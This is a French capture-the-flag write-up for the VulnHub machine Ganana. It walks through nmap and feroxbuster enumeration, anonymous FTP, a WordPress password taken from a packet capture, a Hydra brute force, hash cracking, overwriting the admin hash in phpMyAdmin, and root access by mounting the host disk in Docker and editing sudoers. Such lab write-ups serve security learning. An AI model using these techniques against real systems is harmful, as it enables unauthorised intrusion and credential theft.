# Solution du CTF Ganana de VulnHub

Onboarding
----------

[Ganana](https://www.vulnhub.com/entry/ganana-1,497/), conçu par [Jeevana Chandra](https://jeevanachandra.github.io/) est un CTF de type boot2root téléchargeable sur VulnHub.  

```plain
$ sudo nmap -sCV -p- -T5 192.168.56.21 
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for 192.168.56.21 
Host is up (0.00033s latency). 
Not shown: 65531 filtered tcp ports (no-response) 
PORT     STATE  SERVICE  VERSION 
22/tcp   closed ssh 
80/tcp   open   http     Apache httpd (PHP 7.3.17) 
|_http-title: Ganana 
| http-robots.txt: 1 disallowed entry  
|_/wp-admin/ 
|_http-generator: WordPress 5.4.2 
|_http-server-header: Apache 
443/tcp  open   ssl/http Apache httpd (PHP 7.3.17) 
|_ssl-date: TLS randomness does not represent time 
| ssl-cert: Subject: commonName=www.example.com/organizationName=Bitnami 
| Not valid before: 2020-06-06T10:55:45 
|_Not valid after:  2030-06-04T10:55:45 
|_http-generator: WordPress 5.4.2 
| http-robots.txt: 1 disallowed entry  
|_/wp-admin/ 
|_http-title: Ganana 
|_http-server-header: Apache 
6777/tcp open   ftp      vsftpd 3.0.3 
| ftp-syst:  
|   STAT:  
| FTP server status: 
|      Connected to ::ffff:192.168.56.1 
|      Logged in as ftp 
|      TYPE: ASCII 
|      No session bandwidth limit 
|      Session timeout in seconds is 300 
|      Control connection is plain text 
|      Data connections will be plain text 
|      At session startup, client count was 1 
|      vsFTPd 3.0.3 - secure, fast, stable 
|_End of status 
| ftp-anon: Anonymous FTP login allowed (FTP code 230) 
|_Can't get directory listing: TIMEOUT
```

Le port 443 semble identique au port 80 donc on oublie aussitôt. Le port SSH est quand à lui fermé ce qui nous compliquera éventuellement la tache. Pour finir un serveur FTP écoute sur le port 6777 et autorise les connexions anonymes.  

```plain
$ ftp 192.168.56.21 -P 6777 
Connected to 192.168.56.21. 
220 (vsFTPd 3.0.3) 
Name (192.168.56.21:sirius): anonymous 
331 Please specify the password. 
Password:  
230 Login successful. 
Remote system type is UNIX. 
Using binary mode to transfer files. 
ftp> passive 
Passive mode: off; fallback to active mode: off. 
ftp> ls -a 
200 EPRT command successful. Consider using EPSV. 
150 Here comes the directory listing. 
drwxr-xr-x    3 0        112          4096 Jun 06  2020 . 
drwxr-xr-x    3 0        112          4096 Jun 06  2020 .. 
drwxr-xr-x    2 0        0            4096 Jun 06  2020 .Welcome 
226 Directory send OK. 
ftp> put shell.php 
local: shell.php remote: shell.php 
200 EPRT command successful. Consider using EPSV. 
550 Permission denied. 
ftp> cd .Welcome 
250 Directory successfully changed. 
ftp> ls -a 
200 EPRT command successful. Consider using EPSV. 
150 Here comes the directory listing. 
drwxr-xr-x    2 0        0            4096 Jun 06  2020 . 
drwxr-xr-x    3 0        112          4096 Jun 06  2020 .. 
-rw-r--r--    1 0        0              82 Jun 06  2020 .Note.txt 
226 Directory send OK. 
ftp> get .Note.txt 
local: .Note.txt remote: .Note.txt 
200 EPRT command successful. Consider using EPSV. 
150 Opening BINARY mode data connection for .Note.txt (82 bytes). 
100% |****************************************************************|    82       37.98 KiB/s    00:00 ETA 
226 Transfer complete. 
82 bytes received in 00:00 (29.98 KiB/s)
```

Les transferts de fichiers échouent en mode passif mais en mode actif cela fonctionne très bien.  

On ne peut pas déposer de fichiers sur le serveur et le fichier obtenu ne nous est d'aucune utilité :  

> Hey Welcome to the ORG!!! Hope you have a wonderfull experence working with US!!!

Faute de mieux c'est parti pour une énumération :  

```plain
$ feroxbuster -u http://192.168.56.21/ -w /tools/fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt  -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.21/
 🚀  Threads               │ 50
 📖  Wordlist              │ /tools/fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        7l       20w      238c http://192.168.56.21/wp-admin
301        7l       20w      241c http://192.168.56.21/wp-includes
301        7l       20w      240c http://192.168.56.21/wp-content
403      121l      322w        0c http://192.168.56.21/logout
302        0l        0w        0c http://192.168.56.21/register
405        1l        6w        0c http://192.168.56.21/xmlrpc
301        0l        0w        0c http://192.168.56.21/feed
301        0l        0w        0c http://192.168.56.21/rss
301        7l       20w      240c http://192.168.56.21/phpmyadmin
302        0l        0w        0c http://192.168.56.21/dashboard
302        0l        0w        0c http://192.168.56.21/secret
301        0l        0w        0c http://192.168.56.21/0
200        4l       31w      156c http://192.168.56.21/tasks
301        0l        0w        0c http://192.168.56.21/embed
301        0l        0w        0c http://192.168.56.21/atom
200      384l     3177w    19915c http://192.168.56.21/license
301        0l        0w        0c http://192.168.56.21/rss2
200       73l      217w     6683c http://192.168.56.21/
200       97l      819w     7274c http://192.168.56.21/readme
200      102l      291w     7791c http://192.168.56.21/lostpassword
301        0l        0w        0c http://192.168.56.21/rdf
301        0l        0w        0c http://192.168.56.21/0000
200        0l        0w        0c http://192.168.56.21/wp-config
301        0l        0w        0c http://192.168.56.21/page1
500      121l      312w        0c http://192.168.56.21/wp-signup
302        0l        0w        0c http://192.168.56.21/resetpass
```

Je remarque (en ouvrant les différentes URLs) que le Wordpress présent est configuré pour que sa zone admin soit */secret* au lieu de l'habituel */wp-admin*.  

Le fichier *tasks* contient le contenu suivant :  

> Hey Jarret Lee!  
> 
>   
> 
> Do manage the office as the admin is away for a few weeks!   
> 
> Admin has created an other temp account for you and details in a pcapng file. 

Bien sûr, c'est normal de communiquer un mot de passe à quelqu'un en lui refilant un pcapng :D
Alors que j'avais lancé cette fois une énumérations sur les fichiers j'ai fait ce qui me semblait le plus logique : vérifier si il y avait un fichier *jarret.pcapng* à la racine. C'était le cas :)  

Il y a différents échanges dans la capture : DNS, TLS, etc. Evidemment on est plus intéressés par le trafic en clair sur la page de login du wordpress. Avec le filtre suivant je peux voir 5 requêtes HTTP POST :  

```plain
http.request.method == "POST"
```

La dernière requête contient le mot de passe valide :  

```plain
log=jarretlee&pwd=NoBrUtEfOrCe__R3Qu1R3d__
```

Collection de passwords
-----------------------

Une fois connecté sur le Wordpress on remarque (en dehors du fait que l'on n'est pas admin) un article en Draft baptisé *Keep dis SECRET!!!!* qui contient le texte suivant :  

```plain
QGx3YXlzLUAtU3VwM3ItU2VjdXIzLXBAU1N3MFJkISE
```

Soit le texte suivant décodé en base64 : *@lways-@-Sup3r-Secur3-p@SSw0Rd!!*

J'ai mis le peu d'utilisateurs et mots de passe à ma disposition dans des fichiers et lancé Hydra pour voir s'ils étaient utiles. Il y a déjà un mot de passe réutilisé :  

```plain
$ hydra -L users.txt -P pass.txt ftp://192.168.56.21:6777 
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). 

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries (l:6/p:2), ~1 try per task 
[DATA] attacking ftp://192.168.56.21:6777/ 
[6777][ftp] host: 192.168.56.21   login: jarretlee   password: NoBrUtEfOrCe__R3Qu1R3d__ 
1 of 1 target successfully completed, 1 valid password found 
```

Je trouve ainsi dans le dossier de cet utilisateur un fichier *.backups* encodé en base64 dont le clair est le suivant :  

```plain
jeevan:$6$LXNakaBRJ/tL5F2a$bCgiylk/LY2MeFp5z9YZyiezsNsgj.5/cDohRgFRBNdrwi/2IPkUO0rqVIM3O8vysc48g3Zpo/sHuo.qwBf4U1:18430:0:99999:7:::
```

D'après [cette page](https://hashcat.net/wiki/doku.php?id=example_hashes) il s'agit d'un hash en sha512. Le mot de passe correspondant trouvé avec *Penglab* est *hannahmontana*.  

J'ai eu ensuite un moment d'errance avant de remarquer que l'on pouvait remonter dans l'arborscence du FTP (qui servait par défaut le home de l'utilisateur *jarretlee*).  

Le serveur utilise *Bitnami* qui est un logiciel permettant d'installer facilement différents serveurs et webapps pré-packagés comme ici le Wordpress.  

Ainsi j'ai fini par trouver le dossier */opt/bitnami/apps/wordpress/htdocs* dans lequel se trouvait le fichier *wp-config.php*.  

A ce titre ce n'était pas évident qu'on puisse lire son contenu car le fichier était marqué en lecture uniquement pour l'utilisateur et le groupe et à côté l'upload de fichier échouait sur des dossiers qui avait les permissions d'écriture pour le groupe. Bref l'auteur du CTF a du changer le groupe associé au fichier *wp-config.php* et malheureusement le nom du groupe n’apparaît pas sur FileZilla.  

```php
/** The name of the database for WordPress */ 
define( 'DB_NAME', 'bitnami_wordpress' ); 

/** MySQL database username */ 
define( 'DB_USER', 'bn_wordpress' ); 

/** MySQL database password */ 
define( 'DB_PASSWORD', 'aa75e9f9b1' ); 

/** MySQL hostname */ 
define( 'DB_HOST', 'localhost:3306' );
```

On peut utiliser ces identifiants pour accéder à la base de données car, comme indiqué dans l'énumération du début, *phpMyAdmin* est présent.  

C'est dans la table *wp-users* que je trouve un autre utilisateur pour le Wordpress : *charleywalker*. Aucun doute qu'il s'agisse de l'administrateur.  

Son hash, bien que simple MD5 de type Unix (*$1$*) ne semble pas tomber même avec la wordlist *hashesorg2019* de Penglab.  

J'ai donc écrasé son hash par celui de *jarretlee* ce qui me permet de me connecter sur l'interface admin avec le mot de passe *NoBrUtEfOrCe\_\_R3Qu1R3d\_\_*.  

La suite est classique, *Appearance* puis *Theme Editor* qui permet d'éditer un des fichiers PHP et de finalement obtenir notre exécution de commande.  

Le fichier */etc/passwd* indique 3 utilisateurs non privilégiés :  

```plain
john:x:1002:1004:John,,8565430143,:/home/john:/bin/bash 
jeevan:x:1003:1005:,,,:/home/jeevan:/bin/bash 
jarretlee:x:1000:1000:,,,:/home/jarretlee:/bin/bash
```

On dispose justement du mot de passe de l'utilisateur *jeevan* (*hannahmontana*). On peut changer d'utilisateur via la commande *su*.  

Cette utilisateur est membre du groupe Docker. On va créer un container en indiquant que l'on veut monter le disque de la machine. L'accès root obtenu dans le container nous permettra d'accéder au système de fichier de l'hôte.  

```plain
jeevan@debian:/$ docker images  
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE 
bash                latest              0980cb958276        20 months ago       13.1MB 
alpine              latest              a24bb4013296        20 months ago       5.57MB 
hello-world         latest              bf756fb1ae65        2 years ago         13.3kB

jeevan@debian:/$ docker run -v /:/mnt/ -it alpine /bin/sh   
/ # cd /mnt 
/mnt # cd etc 
/mnt/etc # cat sudoers 
# 
# This file MUST be edited with the 'visudo' command as root. 
# 
# Please consider adding local content in /etc/sudoers.d/ instead of 
# directly modifying this file. 
# 
# See the man page for details on how to write a sudoers file. 
# 
Defaults        env_reset 
Defaults        mail_badpass 
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin" 

# Host alias specification 

# User alias specification 

# Cmnd alias specification 

# User privilege specification 
root    ALL=(ALL:ALL) ALL 

# Allow members of group sudo to execute any command 

# See sudoers(5) for more information on "#include" directives: 

#includedir /etc/sudoers.d 
/mnt/etc # echo "jeevan ALL=(ALL) ALL" >> sudoers 
```

Avec cette ligne ajoutée au fichier *sudoers* je peux obtenir un shell root :  

```plain
jeevan@debian:/$ sudo su 
[sudo] password for jeevan:  
root@debian:/# id 
uid=0(root) gid=0(root) groups=0(root) 
root@debian:/# cd /root 
root@debian:~# ls 
bitnami  bitnami_credentials  jeevan  root.txt 
root@debian:~# cat root.txt  

                    _       _                 _                              _     
 __ __ __  ___     | |     | |      o O O  __| |    ___    _ _      ___     | |    
 \ V  V / / -_)    | |     | |     o      / _` |   / _ \  | ' \    / -_)    |_|    
  \_/\_/  \___|   _|_|_   _|_|_   TS__[O] \__,_|   \___/  |_||_|   \___|   _(_)_   
_|"""""|_|"""""|_|"""""|_|"""""| {======|_|"""""|_|"""""|_|"""""|_|"""""|_| """ |  
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'

```


*Published February 04 2022 at 12:03*